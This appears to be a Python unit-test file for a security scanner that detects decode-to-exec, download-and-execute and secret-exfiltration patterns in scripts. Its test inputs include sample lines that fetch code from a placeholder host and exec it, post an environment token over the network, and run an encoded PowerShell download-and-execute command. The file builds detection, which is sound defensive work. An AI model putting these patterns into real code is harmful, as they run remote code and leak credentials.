from __future__ import annotations

import base64
import json
import os
from pathlib import Path
import tempfile
import time
import unittest
from unittest.mock import patch

from wrapperguard_sdk import cli
from wrapperguard_sdk.profile import IntegrationProfile, RunnerConfig
from wrapperguard_sdk.semantics import analyze_snapshot


class SemanticSignalTests(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory(prefix="wg-semantic-tests-")
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)

    def analyze(self, source, filename="input.py"):
        (self.root / filename).write_text(source, encoding="utf-8")
        return analyze_snapshot(self.root, deadline=time.monotonic() + 2)

    def test_literal_decode_and_def_use_to_exec_are_advisory_without_payload_disclosure(self):
        payload = base64.b64encode(b"dangerous-payload-secret-never-export").decode()
        report = self.analyze(f"import base64 as b\nfirst='{payload[:12]}'\nsecond='{payload[12:]}'\nvalue=b.b64decode(first+second).decode('utf-8')\nexec(value)\n")
        self.assertEqual([f["ruleId"] for f in report["findings"]], ["WG-RESEARCH-DECODE-EXEC"])
        self.assertEqual(report["findings"][0]["kind"], "AUDIT_EVIDENCE")
        self.assertEqual(report["findings"][0]["severity"], "WARN")
        self.assertEqual(report["findings"][0]["actions"], ["WARNING"])
        serialized = json.dumps(report)
        self.assertNotIn(payload, serialized)
        self.assertNotIn("dangerous-payload-secret", serialized)
        self.assertTrue(report["complete"])

    def test_download_and_environment_flows_are_traced_without_executing_source(self):
        marker = self.root / "must-not-execute"
        report = self.analyze(f"from pathlib import Path\nPath({str(marker)!r}).touch()\nimport requests as r\nimport os\nresponse=r.get('https://example.invalid')\nexec(response.text)\nsecret=os.environ.get('TOKEN')\nr.post('https://example.invalid',data={{'credential':secret}})\n")
        self.assertEqual({f["ruleId"] for f in report["findings"]}, {"WG-RESEARCH-DOWNLOAD-EXEC", "WG-RESEARCH-ENV-NETWORK"})
        self.assertFalse(marker.exists())
        self.assertNotIn("example.invalid", json.dumps(report))

    def test_urllib_dotted_import_binds_the_top_level_module(self):
        report = self.analyze("import urllib.request\nvalue=urllib.request.urlopen('https://example.invalid').read()\nexec(value)\n")
        self.assertTrue(any(f["ruleId"] == "WG-RESEARCH-DOWNLOAD-EXEC" for f in report["findings"]))

    def test_benign_decode_logging_reassignment_shadowed_call_and_branching_do_not_manufacture_flows(self):
        cases = [
            "import base64\nprint(base64.b64decode('aGVsbG8gd29ybGQ='))\n",
            "import base64\nvalue=base64.b64decode('aGVsbG8gd29ybGQ=')\nvalue='safe'\nexec(value)\n",
            "import base64\ndef exec(value):\n print(value)\nexec(base64.b64decode('aGVsbG8gd29ybGQ='))\n",
            "import base64\nexec=print\nexec(base64.b64decode('aGVsbG8gd29ybGQ='))\n",
            "import base64\nvalue='safe'\nif condition:\n value=base64.b64decode('aGVsbG8gd29ybGQ=')\nelse:\n exec(value)\n",
        ]
        for source in cases:
            with self.subTest(source=source):
                report = self.analyze(source)
                self.assertEqual(report["findings"], [])

    def test_function_local_aliases_and_tuple_reassignment_do_not_escape_their_scope(self):
        cases = [
            "def helper():\n import base64 as b\nexec(b.b64decode('aGVsbG8gd29ybGQ='))\n",
            "import base64\nvalue=base64.b64decode('aGVsbG8gd29ybGQ=')\nvalue,other=('safe',1)\nexec(value)\n",
            "import base64\ndef review(*exec):\n exec(base64.b64decode('aGVsbG8gd29ybGQ='))\n",
            "import base64\nclass eval:\n pass\neval(base64.b64decode('aGVsbG8gd29ybGQ='))\n",
        ]
        for source in cases:
            with self.subTest(source=source):
                self.assertEqual(self.analyze(source)["findings"], [])

    def test_function_parameters_shadow_builtins_and_imports(self):
        report = self.analyze("import base64\ndef review(exec,base64):\n exec(base64.b64decode('aGVsbG8gd29ybGQ='))\n")
        self.assertEqual(report["findings"], [])

    def test_powershell_utf16_encoded_behavior_and_benign_encoding_remain_distinct(self):
        dangerous = base64.b64encode(b"I\x00n\x00v\x00o\x00k\x00e\x00-\x00W\x00e\x00b\x00R\x00e\x00q\x00u\x00e\x00s\x00t\x00 \x00h\x00t\x00t\x00p\x00s\x00:\x00/\x00/\x00e\x00x\x00a\x00m\x00p\x00l\x00e\x00.\x00i\x00n\x00v\x00a\x00l\x00i\x00d\x00 \x00|\x00 \x00i\x00e\x00x\x00").decode()
        benign = base64.b64encode("Write-Output 'hello'".encode("utf-16-le")).decode()
        report = self.analyze(f"pwsh -EncodedCommand {dangerous}\npowershell -enc {benign}\n# pwsh -enc {dangerous}\n", "input.ps1")
        self.assertEqual([f["severity"] for f in report["findings"]], ["WARN", "INFO"])
        self.assertEqual(report["findings"][1]["actions"], [])
        self.assertNotIn(dangerous, json.dumps(report))
        self.assertNotIn("example.invalid", json.dumps(report))
        self.assertTrue(all(f["kind"] == "AUDIT_EVIDENCE" for f in report["findings"]))

    def test_malformed_python_binary_source_and_ast_budget_reduce_coverage(self):
        for source in ("def invalid(\n", "print('x')\x00", "x=1\ny=2\n"):
            with self.subTest(source=source), patch("wrapperguard_sdk.semantics.MAX_AST_NODES", 3):
                report = self.analyze(source)
                self.assertFalse(report["complete"])
                self.assertTrue(any(n["code"] == "WG-RESEARCH-PARTIAL" for n in report["notices"]))

    def test_oversized_decoded_powershell_literal_is_partial_and_deadline_is_enforced(self):
        encoded = base64.b64encode(b"literal-too-large").decode()
        with patch("wrapperguard_sdk.semantics.MAX_LITERAL_BYTES", 4):
            report = self.analyze(f"pwsh -enc {encoded}\n", "input.ps1")
        self.assertFalse(report["complete"])
        self.assertEqual(report["findings"], [])
        with self.assertRaises(TimeoutError):
            analyze_snapshot(self.root, deadline=time.monotonic() - 1)

    @unittest.skipUnless(os.name == "posix" and hasattr(os, "O_NOFOLLOW"), "Snapshot runners require POSIX")
    def test_empty_and_symlinked_project_inputs_are_explicit_partial_not_clean(self):
        project = self.root / "project"
        project.mkdir()
        profile = IntegrationProfile("research.script-semantics", "Research", "1", "SAST", "script-semantics", None,
                                     RunnerConfig("script-semantics"), ("SCAN",), ("BLOCK_BUILD",), None)
        report = cli.evaluate(profile, project, "SCAN")
        self.assertFalse(report["complete"])
        self.assertTrue(any(n["code"] == "WG-SDK-NO-INPUTS" for n in report["notices"]))
        outside = self.root / "outside.py"
        outside.write_text("exec('never execute')", encoding="utf-8")
        (project / "linked.py").symlink_to(outside)
        report = cli.evaluate(profile, project, "SCAN")
        self.assertFalse(report["complete"])
        self.assertEqual(report["scannedFiles"], 0)


if __name__ == "__main__":
    unittest.main()
